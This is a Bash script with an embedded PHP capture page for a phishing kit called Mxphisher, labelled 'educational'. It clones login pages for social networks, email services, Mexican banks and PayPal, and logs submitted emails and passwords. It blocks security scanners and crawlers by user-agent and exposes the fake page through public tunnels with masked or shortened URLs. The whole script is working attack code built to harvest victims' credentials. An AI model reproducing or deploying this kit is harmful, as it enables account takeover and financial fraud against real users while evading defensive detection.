#!/bin/bash

# Mxphisher - Herramienta de phishing educativa
# Autor: Falconmx1
# Versión: 2.0 - Full Edition

trap ctrl_c INT
ctrl_c() {
    echo -e "\n\n[\033[31m✘\033[0m] Saliendo...\n"
    killall ngrok php cloudflared 2>/dev/null
    exit 1
}

# Colores bien vergas
R="\033[0;31m"
G="\033[0;32m"
Y="\033[0;33m"
B="\033[0;34m"
M="\033[0;35m"
C="\033[0;36m"
W="\033[0;37m"
NC="\033[0m"

# Cargar módulos
source core/banner.sh
source core/cloner.sh
source core/tunnel.sh
source core/anti_robots.sh
source core/logger.sh
source core/url_mask.sh

# Variables globales
SITIO_SELECCIONADO=""
URL_ORIGINAL=""
PUERTO=8080
TIPO_TUNEL=""
SERVER_PID=""
TUNEL_PID=""
URL_FINAL=""

# Menú de sitios (20+ opciones)
menu_sitios() {
    banner_calavera
    echo -e "\n${Y}┌─────────────────────────────────────────────────┐${NC}"
    echo -e "${Y}│${W}  📱 REDES SOCIALES                              ${Y}│${NC}"
    echo -e "${Y}│${W}  1${Y})${W} Facebook          ${Y}│${W}  2${Y})${W} Instagram        ${Y}│${NC}"
    echo -e "${Y}│${W}  3${Y})${W} Twitter           ${Y}│${W}  4${Y})${W} TikTok           ${Y}│${NC}"
    echo -e "${Y}│${W}  5${Y})${W} LinkedIn          ${Y}│${W}  6${Y})${W} Snapchat         ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  📧 CORREOS Y SERVICIOS                        ${Y}│${NC}"
    echo -e "${Y}│${W}  7${Y})${W} Gmail             ${Y}│${W}  8${Y})${W} Outlook          ${Y}│${NC}"
    echo -e "${Y}│${W}  9${Y})${W} Yahoo             ${Y}│${W}  10${Y})${W} ProtonMail       ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  🏦 BANCOS MEXICANOS                           ${Y}│${NC}"
    echo -e "${Y}│${W}  11${Y})${W} BBVA México       ${Y}│${W}  12${Y})${W} Banorte          ${Y}│${NC}"
    echo -e "${Y}│${W}  13${Y})${W} Santander         ${Y}│${W}  14${Y})${W} Citibanamex      ${Y}│${NC}"
    echo -e "${Y}│${W}  15${Y})${W} HSBC              ${Y}│${W}  16${Y})${W} Scotiabank       ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  🎬 STREAMING Y OTROS                          ${Y}│${NC}"
    echo -e "${Y}│${W}  17${Y})${W} Netflix           ${Y}│${W}  18${Y})${W} Spotify          ${Y}│${NC}"
    echo -e "${Y}│${W}  19${Y})${W} Amazon            ${Y}│${W}  20${Y})${W} PayPal           ${Y}│${NC}"
    echo -e "${Y}│${W}  21${Y})${W} Microsoft         ${Y}│${W}  22${Y})${W} Dropbox          ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  23${Y})${W} URL personalizada                    ${Y}│${NC}"
    echo -e "${Y}│${W}  24${Y})${W} Salir                               ${Y}│${NC}"
    echo -e "${Y}└─────────────────────────────────────────────────┘${NC}"
    echo -ne "\n${B}➤${W} Elige el sitio a clonar: "
    read opcion

    case $opcion in
        1) SITIO_SELECCIONADO="facebook"; URL_ORIGINAL="https://facebook.com";;
        2) SITIO_SELECCIONADO="instagram"; URL_ORIGINAL="https://instagram.com";;
        3) SITIO_SELECCIONADO="twitter"; URL_ORIGINAL="https://twitter.com";;
        4) SITIO_SELECCIONADO="tiktok"; URL_ORIGINAL="https://tiktok.com";;
        5) SITIO_SELECCIONADO="linkedin"; URL_ORIGINAL="https://linkedin.com";;
        6) SITIO_SELECCIONADO="snapchat"; URL_ORIGINAL="https://snapchat.com";;
        7) SITIO_SELECCIONADO="gmail"; URL_ORIGINAL="https://gmail.com";;
        8) SITIO_SELECCIONADO="outlook"; URL_ORIGINAL="https://outlook.com";;
        9) SITIO_SELECCIONADO="yahoo"; URL_ORIGINAL="https://yahoo.com";;
        10) SITIO_SELECCIONADO="protonmail"; URL_ORIGINAL="https://protonmail.com";;
        11) SITIO_SELECCIONADO="bbva"; URL_ORIGINAL="https://www.bbva.mx";;
        12) SITIO_SELECCIONADO="banorte"; URL_ORIGINAL="https://www.banorte.com";;
        13) SITIO_SELECCIONADO="santander"; URL_ORIGINAL="https://www.santander.com.mx";;
        14) SITIO_SELECCIONADO="citibanamex"; URL_ORIGINAL="https://www.banamex.com";;
        15) SITIO_SELECCIONADO="hsbc"; URL_ORIGINAL="https://www.hsbc.com.mx";;
        16) SITIO_SELECCIONADO="scotiabank"; URL_ORIGINAL="https://www.scotiabank.com.mx";;
        17) SITIO_SELECCIONADO="netflix"; URL_ORIGINAL="https://www.netflix.com";;
        18) SITIO_SELECCIONADO="spotify"; URL_ORIGINAL="https://www.spotify.com";;
        19) SITIO_SELECCIONADO="amazon"; URL_ORIGINAL="https://www.amazon.com.mx";;
        20) SITIO_SELECCIONADO="paypal"; URL_ORIGINAL="https://www.paypal.com";;
        21) SITIO_SELECCIONADO="microsoft"; URL_ORIGINAL="https://www.microsoft.com";;
        22) SITIO_SELECCIONADO="dropbox"; URL_ORIGINAL="https://www.dropbox.com";;
        23) 
            echo -ne "${B}➤${W} URL completa (con https://): "
            read URL_ORIGINAL
            SITIO_SELECCIONADO=$(echo $URL_ORIGINAL | sed 's/https:\/\///' | sed 's/\./_/g' | cut -d'/' -f1)
            ;;
        24) exit 0;;
        *) echo -e "${R}[✘] Opción no válida"; sleep 1; menu_sitios;;
    esac
    
    menu_túneles
}

# Menú de túneles
menu_túneles() {
    banner_calavera
    echo -e "\n${Y}┌─────────────────────────────────┐${NC}"
    echo -e "${Y}│${W}  🌐 SELECCIONA EL TÚNEL        ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  1${Y})${W} Ngrok (Rápido)         ${Y}│${NC}"
    echo -e "${Y}│${W}  2${Y})${W} Serveo (Sin registro)  ${Y}│${NC}"
    echo -e "${Y}│${W}  3${Y})${W} Localhost.run         ${Y}│${NC}"
    echo -e "${Y}│${W}  4${Y})${W} Cloudflared (Argo)    ${Y}│${NC}"
    echo -e "${Y}└─────────────────────────────────┘${NC}"
    echo -ne "\n${B}➤${W} Elige tu túnel: "
    read opcion_tunel
    
    case $opcion_tunel in
        1) TIPO_TUNEL="ngrok";;
        2) TIPO_TUNEL="serveo";;
        3) TIPO_TUNEL="localhost";;
        4) TIPO_TUNEL="cloudflare";;
        *) echo -e "${R}[✘] Opción no válida, usando Ngrok"; TIPO_TUNEL="ngrok";;
    esac
    
    menu_masking
}

# Menú de enmascaramiento
menu_masking() {
    banner_calavera
    echo -e "\n${Y}┌─────────────────────────────────┐${NC}"
    echo -e "${Y}│${W}  🎭 ENMASCARAMIENTO DE URL    ${Y}│${NC}"
    echo -e "${Y}├─────────────────────────────────┤${NC}"
    echo -e "${Y}│${W}  1${Y})${W} Sin máscara           ${Y}│${NC}"
    echo -e "${Y}│${W}  2${Y})${W} Bit.ly (acortador)    ${Y}│${NC}"
    echo -e "${Y}│${W}  3${Y})${W} Dominio falso         ${Y}│${NC}"
    echo -e "${Y}│${W}  4${Y})${W} URL personalizada     ${Y}│${NC}"
    echo -e "${Y}└─────────────────────────────────┘${NC}"
    echo -ne "\n${B}➤${W} Opción: "
    read opcion_mask
    
    case $opcion_mask in
        2) MASK_TYPE="bitly";;
        3) MASK_TYPE="fake_domain";;
        4) MASK_TYPE="custom";;
        *) MASK_TYPE="none";;
    esac
    
    iniciar_ataque
}

iniciar_ataque() {
    echo -e "\n${G}[+]${W} Preparando Mxphisher para: ${Y}$SITIO_SELECCIONADO${NC}"
    echo -e "${G}[+]${W} Usando túnel: ${Y}$TIPO_TUNEL${NC}"
    
    # Clonar el sitio
    clonar_sitio "$URL_ORIGINAL" "$SITIO_SELECCIONADO"
    
    # Generar PHP capturador con anti-robots
    generar_phish_con_anti_robots "$SITIO_SELECCIONADO"
    
    # Iniciar servidor PHP
    iniciar_servidor
    
    # Iniciar túnel seleccionado
    iniciar_tunel
    
    # Aplicar enmascaramiento
    if [ "$MASK_TYPE" != "none" ]; then
        URL_FINAL=$(aplicar_mascara "$URL_FINAL" "$SITIO_SELECCIONADO" "$MASK_TYPE")
    fi
    
    # Mostrar información
    mostrar_info
    
    # Monitorear logs
    monitorear_logs
}

generar_phish_con_anti_robots() {
    local sitio=$1
    
    # Generar el PHP con anti-robots integrado
    cat > "sites/$sitio/login.php" << 'EOF'
<?php
// Mxphisher - Capturador con anti-robots
session_start();

// ===== ANTI-ROBOTS =====
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('curl', 'python', 'wget', 'bot', 'spider', 'crawler', 'scanner', 'nmap', 'sqlmap', 'nikto', 'gobuster', 'dirb', 'wfuzz', 'masscan', 'zgrab', 'http-client', 'Java', 'Perl', 'Ruby', 'Go-http', 'axios', 'fetch');

foreach($bots as $bot) {
    if(stripos($user_agent, $bot) !== false) {
        http_response_code(403);
        die("🚫 Acceso denegado: Robots no bienvenidos");
    }
}

// Limitar intentos por IP
$ip = $_SERVER['REMOTE_ADDR'];
$intentos_file = "intentos_$ip.json";
if(file_exists($intentos_file)) {
    $intentos = json_decode(file_get_contents($intentos_file), true);
    if($intentos['count'] > 10 && time() - $intentos['first'] < 3600) {
        die("⏰ Demasiados intentos, espera 1 hora");
    }
} else {
    $intentos = ['count' => 0, 'first' => time()];
}

// ===== CAPTURA DE CREDENCIALES =====
$email = $_POST['email'] ?? $_POST['username'] ?? $_POST['user'] ?? $_POST['login'] ?? '';
$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['pwd'] ?? $_POST['contraseña'] ?? '';

if($email && $password) {
    // Guardar intentos
    $intentos['count']++;
    file_put_contents($intentos_file, json_encode($intentos));
    
    // Formatear log
    $fecha = date('Y-m-d H:i:s');
    $log_entry = "[$fecha] IP: $ip | UA: $user_agent | EMAIL: $email | PASS: $password" . PHP_EOL;
    file_put_contents("../logs/{$sitio}_creds.log", $log_entry, FILE_APPEND);
    
    // Redirigir al sitio real
    header("Location: index.original.html?error=login_error");
    exit();
} else {
    header("Location: index.html?error=1");
}
?>
EOF
    
    # Reemplazar variable sitio
    sed -i "s/{$sitio}/$sitio/g" "sites/$sitio/login.php"
    
    # Respaldar index original
    if [ -f "sites/$sitio/index.html" ]; then
        cp "sites/$sitio/index.html" "sites/$sitio/index.original.html"
    fi
    
    echo -e "${G}[✔]${W} Phishing personalizado con anti-robots listo"
}

iniciar_servidor() {
    cd "sites/$SITIO_SELECCIONADO"
    php -S 0.0.0.0:$PUERTO > /dev/null 2>&1 &
    SERVER_PID=$!
    cd ../..
    echo -e "${G}[✔]${W} Servidor PHP corriendo en puerto $PUERTO (PID: $SERVER_PID)"
}

iniciar_tunel() {
    case $TIPO_TUNEL in
        "ngrok")
            URL_FINAL=$(iniciar_ngrok $PUERTO)
            ;;
        "serveo")
            URL_FINAL=$(iniciar_serveo $PUERTO)
            ;;
        "localhost")
            URL_FINAL=$(iniciar_localhost_run $PUERTO)
            ;;
        "cloudflare")
            URL_FINAL=$(iniciar_cloudflared $PUERTO)
            ;;
    esac
    
    if [ "$URL_FINAL" = "ERROR" ] || [ -z "$URL_FINAL" ]; then
        echo -e "${R}[✘] Error al iniciar el túnel${NC}"
        exit 1
    fi
}

mostrar_info() {
    echo -e "\n${C}═══════════════════════════════════════════════════════${NC}"
    echo -e "${G}✨ MXPHISHER LISTO PARA PISHING ÉTICO ✨${NC}"
    echo -e "${C}═══════════════════════════════════════════════════════${NC}"
    echo -e "${Y}📡 Local:${W}      http://localhost:$PUERTO"
    echo -e "${Y}🌍 Túnel:${W}      $URL_FINAL"
    echo -e "${Y}🎭 Máscara:${W}    $( [ "$MASK_TYPE" != "none" ] && echo "Activada ($MASK_TYPE)" || echo "Sin máscara")"
    echo -e "${Y}📁 Logs:${W}       logs/${SITIO_SELECCIONADO}_creds.log"
    echo -e "${Y}🛡️ Anti-robots:${W} Activado"
    echo -e "${C}═══════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${R}⚠️  COMPARTE SOLO EL ENLACE DEL TÚNEL ⚠️${NC}"
    echo -e "${Y}💀 Esperando víctimas... (Ctrl+C para salir)${NC}\n"
}

monitorear_logs() {
    LOG_FILE="logs/${SITIO_SELECCIONADO}_creds.log"
    mkdir -p logs
    touch "$LOG_FILE"
    
    echo -e "${C}[*] Monitoreando capturas en tiempo real:\n"
    tail -f "$LOG_FILE" 2>/dev/null | while IFS= read -r linea; do
        if [[ $linea == *"EMAIL"* ]]; then
            echo -e "\n${R}════════════════════════════════════════════${NC}"
            echo -e "${G}🎯 ¡CREENCIALES CAPTURADAS!${NC}"
            echo -e "${R}════════════════════════════════════════════${NC}"
            echo -e "${C}$linea${NC}"
            echo -e "${R}════════════════════════════════════════════${NC}\n"
        else
            echo -e "${Y}$linea${NC}"
        fi
    done
}

# Verificar dependencias
echo -e "${C}[*] Verificando dependencias...${NC}"
for cmd in php wget curl; do
    if ! command -v $cmd &> /dev/null; then
        echo -e "${R}[✘] $cmd no instalado. Instálalo con: sudo apt install $cmd -y${NC}"
        exit 1
    fi
done

# Ejecutar
menu_sitios
